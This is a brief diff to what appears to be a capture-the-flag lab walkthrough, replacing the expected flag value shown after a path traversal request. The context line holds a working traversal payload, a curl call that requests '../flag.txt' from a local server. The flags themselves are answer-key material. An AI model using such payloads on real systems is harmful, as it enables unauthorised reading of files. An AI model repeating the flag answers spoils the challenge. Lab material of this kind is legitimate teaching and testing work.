@@ -45,7 +45,7 @@ curl --path-as-is "http://localhost:5000/media?name=../flag.txt"
 Expected output:
 
 ```
-FLAG{P4TH_TR4V3RS4L_L3V3L_2}
+FLAG{SNAPTRAIL_OFF_THE_TRAIL}
 ```
 
 ### Going further
